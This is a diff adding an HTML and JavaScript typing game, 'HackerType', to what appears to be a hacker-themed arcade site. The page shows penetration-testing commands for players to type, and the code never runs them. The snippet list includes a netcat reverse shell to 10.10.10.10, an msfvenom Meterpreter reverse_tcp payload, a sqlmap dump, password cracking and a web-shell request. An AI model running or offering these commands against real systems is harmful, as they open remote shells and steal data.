@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HackerType | Red Team Arcade</title>
+    <link rel="stylesheet" href="../css/main.css">
+    <style>
+        .game-container {
+            min-height: 100vh;
+            padding: 100px 2rem 2rem;
+        }
+        
+        .hackertype-interface {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+        
+        .game-header {
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+        
+        .score-board {
+            display: flex;
+            justify-content: center;
+            gap: 3rem;
+            margin-bottom: 2rem;
+        }
+        
+        .score-item {
+            text-align: center;
+        }
+        
+        .score-value {
+            font-size: 3rem;
+            font-weight: 700;
+            color: var(--accent-green);
+            text-shadow: var(--glow-green);
+        }
+        
+        .terminal-screen {
+            background: var(--bg-secondary);
+            border: 1px solid var(--accent-green);
+            border-radius: 8px;
+            padding: 2rem;
+            font-size: 1.1rem;
+            line-height: 1.8;
+            position: relative;
+            min-height: 400px;
+        }
+        
+        .code-line {
+            margin-bottom: 0.5rem;
+            opacity: 0.3;
+            transition: opacity 0.3s;
+        }
+        
+        .code-line.active {
+            opacity: 1;
+            background: rgba(0, 255, 65, 0.1);
+            padding: 0.25rem;
+            border-radius: 4px;
+        }
+        
+        .code-line.completed {
+            opacity: 0.6;
+            color: var(--accent-green);
+        }
+        
+        .cursor {
+            display: inline-block;
+            width: 10px;
+            height: 20px;
+            background: var(--accent-green);
+            animation: blink 0.5s infinite;
+            vertical-align: middle;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: var(--bg-tertiary);
+            margin-top: 2rem;
+            border-radius: 2px;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: var(--accent-green);
+            width: 0%;
+            transition: width 0.3s;
+            box-shadow: var(--glow-green);
+        }
+        
+        .game-over {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: var(--bg-secondary);
+            border: 2px solid var(--accent-red);
+            padding: 3rem;
+            text-align: center;
+            display: none;
+            z-index: 1000;
+            box-shadow: 0 0 50px rgba(255, 0, 64, 0.5);
+        }
+        
+        .game-over h2 {
+            color: var(--accent-red);
+            font-size: 2rem;
+            margin-bottom: 1rem;
+        }
+        
+        .btn-restart {
+            background: var(--accent-green);
+            color: var(--bg-primary);
+            border: none;
+            padding: 1rem 2rem;
+            font-family: var(--font-mono);
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 1rem;
+        }
+    </style>
+</head>
+<body>
+    <nav class="cyber-nav">
+        <div class="nav-container">
+            <a href="/" class="logo">[RYZEN]</a>
+            <a href="../games.html" class="nav-link">← BACK TO ARCADE</a>
+        </div>
+    </nav>
+
+    <div class="game-container">
+        <div class="hackertype-interface">
+            <div class="game-header">
+                <h1>HACKERTYPE</h1>
+                <p>Type the code as fast as possible. Don't let the system trace you!</p>
+            </div>
+            
+            <div class="score-board">
+                <div class="score-item">
+                    <div class="score-value" id="score">0</div>
+                    <div class="label">SCORE</div>
+                </div>
+                <div class="score-item">
+                    <div class="score-value" id="wpm">0</div>
+                    <div class="label">WPM</div>
+                </div>
+                <div class="score-item">
+                    <div class="score-value" id="time">60</div>
+                    <div class="label">TIME</div>
+                </div>
+            </div>
+            
+            <div class="terminal-screen" id="terminal">
+                <div id="codeDisplay"></div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progress"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="game-over" id="gameOver">
+        <h2>SYSTEM BREACH DETECTED</h2>
+        <p>Final Score: <span id="finalScore">0</span></p>
+        <p>WPM: <span id="finalWPM">0</span></p>
+        <button class="btn-restart" onclick="location.reload()">RETRY</button>
+    </div>
+
+    <script>
+        const codeSnippets = [
+            "import subprocess; subprocess.run(['nc', '-e', '/bin/sh', '10.10.10.10', '4444'])",
+            "sudo nmap -sS -sV -O -p- --script vuln 192.168.1.1 -oN scan.txt",
+            "sqlmap -u 'http://target.com/page.php?id=1' --dump --batch --random-agent",
+            "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe -o payload.exe",
+            "hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --force",
+            "gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,txt,html",
+            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+            "curl -X POST -d 'cmd=whoami' http://target.com/shell.php",
+            "john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hash.txt",
+            "ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
+        ];
+
+        let currentLine = 0;
+        let currentChar = 0;
+        let score = 0;
+        let timeLeft = 60;
+        let timer = null;
+        let startTime = null;
+        let gameActive = false;
+
+        function initGame() {
+            const display = document.getElementById('codeDisplay');
+            display.innerHTML = codeSnippets.map((line, i) => 
+                `<div class="code-line ${i === 0 ? 'active' : ''}" data-index="${i}">
+                    <span class="line-num">${String(i+1).padStart(2, '0')}</span> 
+                    <span class="line-content">${escapeHtml(line)}</span>
+                </div>`
+            ).join('');
+            
+            document.addEventListener('keydown', handleInput);
+            startTimer();
+            gameActive = true;
+            startTime = Date.now();
+        }
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        function handleInput(e) {
+            if (!gameActive) return;
+            
+            const currentLineEl = document.querySelector(`.code-line[data-index="${currentLine}"]`);
+            const lineText = codeSnippets[currentLine];
+            const contentEl = currentLineEl.querySelector('.line-content');
+            
+            if (e.key === lineText[currentChar]) {
+                currentChar++;
+                score += 10;
+                document.getElementById('score').textContent = score;
+                
+                // Update display with progress
+                const typed = escapeHtml(lineText.substring(0, currentChar));
+                const remaining = escapeHtml(lineText.substring(currentChar));
+                contentEl.innerHTML = `<span style="color: var(--accent-green)">${typed}</span><span class="cursor"></span>${remaining}`;
+                
+                // Update progress bar
+                const totalChars = codeSnippets.join('').length;
+                const typedChars = codeSnippets.slice(0, currentLine).join('').length + currentChar;
+                document.getElementById('progress').style.width = (typedChars / totalChars * 100) + '%';
+                
+                if (currentChar >= lineText.length) {
+                    currentLineEl.classList.remove('active');
+                    currentLineEl.classList.add('completed');
+                    currentLine++;
+                    currentChar = 0;
+                    
+                    if (currentLine >= codeSnippets.length) {
+                        endGame(true);
+                    } else {
+                        document.querySelector(`.code-line[data-index="${currentLine}"]`).classList.add('active');
+                    }
+                }
+                
+                updateWPM();
+            } else if (e.key.length === 1) {
+                // Wrong key penalty
+                score = Math.max(0, score - 5);
+                document.getElementById('score').textContent = score;
+                currentLineEl.style.background = 'rgba(255, 0, 64, 0.2)';
+                setTimeout(() => {
+                    currentLineEl.style.background = '';
+                }, 100);
+            }
+        }
+
+        function updateWPM() {
+            const minutes = (Date.now() - startTime) / 60000;
+            const wpm = Math.round((score / 10) / 5 / minutes) || 0;
+            document.getElementById('wpm').textContent = wpm;
+        }
+
+        function startTimer() {
+            timer = setInterval(() => {
+                timeLeft--;
+                document.getElementById('time').textContent = timeLeft;
+                
+                if (timeLeft <= 10) {
+                    document.getElementById('time').style.color = 'var(--accent-red)';
+                }
+                
+                if (timeLeft <= 0) {
+                    endGame(false);
+                }
+                
+                updateWPM();
+            }, 1000);
+        }
+
+        function endGame(completed) {
+            gameActive = false;
+            clearInterval(timer);
+            
+            const wpm = document.getElementById('wpm').textContent;
+            document.getElementById('finalScore').textContent = score;
+            document.getElementById('finalWPM').textContent = wpm;
+            document.getElementById('gameOver').style.display = 'block';
+            
+            // Save high score
+            const highScore = localStorage.getItem('hackertypeHigh') || 0;
+            if (score > highScore) {
+                localStorage.setItem('hackertypeHigh', score);
+            }
+        }
+
+        // Start on load
+        window.addEventListener('load', () => {
+            setTimeout(initGame, 1000);
+        });
+    </script>
+</body>
+</html>
